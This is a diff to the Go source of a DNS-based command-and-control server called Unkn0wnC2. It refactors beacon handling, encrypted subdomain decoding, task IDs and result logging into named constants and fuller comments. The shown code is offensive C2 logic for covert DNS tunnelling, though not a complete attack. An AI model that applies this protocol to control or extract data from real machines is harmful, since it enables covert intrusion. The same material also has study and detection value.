@@ -1,3 +1,6 @@
+// Package main implements the C2 management functionality for the Unkn0wnC2 server.
+// This file handles beacon registration, task queuing, result collection, and
+// the core C2 protocol logic including chunked data transmission.
 package main
 
 import (
@@ -6,6 +9,26 @@ import (
 	"strings"
 	"sync"
 	"time"
+)
+
+const (
+	// Task ID numbering
+	taskCounterStart = 1000
+
+	// Subdomain analysis constants
+	legitimateSubdomainMaxLength = 20
+	base36MinLength              = 30
+	base36LongStringThreshold    = 50
+
+	// Timestamp validation
+	unixTimestampMinLength = 10
+	unixTimestampMaxLength = 11
+
+	// Result preview settings
+	resultPreviewMaxLength = 200
+
+	// DNS label chunk size (RFC compliant)
+	dnsLabelMaxLength = 62
 )
 
 // Beacon represents a connected beacon client
@@ -63,7 +86,8 @@ type C2Manager struct {
 	aesKey          []byte
 }
 
-// NewC2Manager creates a new C2 management instance
+// NewC2Manager creates a new C2 management instance with the specified configuration.
+// It initializes the beacon tracking system, task management, and sets up AES encryption.
 func NewC2Manager(debug bool, encryptionKey string) *C2Manager {
 	aesKey := generateAESKey(encryptionKey)
 
@@ -72,7 +96,7 @@ func NewC2Manager(debug bool, encryptionKey string) *C2Manager {
 		tasks:           make(map[string]*Task),
 		resultChunks:    make(map[string][]ResultChunk),
 		expectedResults: make(map[string]*ExpectedResult),
-		taskCounter:     1000,
+		taskCounter:     taskCounterStart,
 		debug:           debug,
 		aesKey:          aesKey,
 	}
@@ -95,6 +119,8 @@ func (c2 *C2Manager) decodeBeaconData(encoded string) (string, error) {
 
 // isLegitimateSubdomain checks if a subdomain looks like a legitimate DNS name
 // rather than encoded C2 data
+// isLegitimateSubdomain determines if a DNS subdomain represents legitimate traffic
+// rather than encoded C2 communications based on pattern analysis.
 func isLegitimateSubdomain(subdomain string) bool {
 	// Convert to lowercase for comparison
 	lower := strings.ToLower(subdomain)
@@ -122,7 +148,7 @@ func isLegitimateSubdomain(subdomain string) bool {
 
 	// If subdomain contains only letters and numbers with dashes (no base36-like pattern)
 	// and is reasonably short, it's probably legitimate
-	if len(subdomain) <= 20 && !looksLikeBase36(subdomain) {
+	if len(subdomain) <= legitimateSubdomainMaxLength && !looksLikeBase36(subdomain) {
 		return true
 	}
 
@@ -130,12 +156,14 @@ func isLegitimateSubdomain(subdomain string) bool {
 }
 
 // looksLikeBase36 checks if a string looks like base36-encoded C2 data
+// looksLikeBase36 analyzes a string to determine if it appears to be Base36-encoded data
+// based on length, character distribution, and entropy characteristics.
 func looksLikeBase36(s string) bool {
 	// Remove any dots (from split labels)
 	clean := strings.ReplaceAll(s, ".", "")
 
 	// Must be reasonably long to be encoded data (base36 encoded AES-GCM data is typically long)
-	if len(clean) < 30 {
+	if len(clean) < base36MinLength {
 		return false
 	}
 
@@ -150,7 +178,7 @@ func looksLikeBase36(s string) bool {
 	// Additional heuristics for base36 encoded data:
 	// - Very long strings are likely encoded data
 	// - High entropy (good mix of numbers and letters) suggests encoding
-	if len(clean) > 50 {
+	if len(clean) > base36LongStringThreshold {
 		return true
 	}
 
@@ -170,7 +198,7 @@ func looksLikeBase36(s string) bool {
 	}
 
 	// If it has both numbers and letters and is reasonably long, it's likely base36 data
-	return hasNumbers && hasLetters && len(clean) >= 30
+	return hasNumbers && hasLetters && len(clean) >= base36MinLength
 }
 
 // processBeaconQuery processes a DNS query from a beacon and returns appropriate response
@@ -215,7 +243,7 @@ func (c2 *C2Manager) processBeaconQuery(qname string, clientIP string) (string, 
 	if len(parts) > 1 {
 		// Check if last part is a timestamp (numeric)
 		lastPart := parts[len(parts)-1]
-		if len(lastPart) >= 10 && len(lastPart) <= 11 { // Unix timestamp length
+		if len(lastPart) >= unixTimestampMinLength && len(lastPart) <= unixTimestampMaxLength { // Unix timestamp length
 			if _, err := strconv.ParseInt(lastPart, 10, 64); err == nil {
 				// Remove timestamp
 				decoded = strings.Join(parts[:len(parts)-1], "|")
@@ -344,8 +372,8 @@ func (c2 *C2Manager) handleResult(parts []string) string {
 
 	// Log receipt of result (include small preview)
 	preview := result
-	if len(preview) > 200 {
-		preview = preview[:200] + "..."
+	if len(preview) > resultPreviewMaxLength {
+		preview = preview[:resultPreviewMaxLength] + "..."
 	}
 	logf("[C2] Received RESULT from %s for %s (%d bytes). Preview: %s", beaconID, taskID, len(result), preview)
 
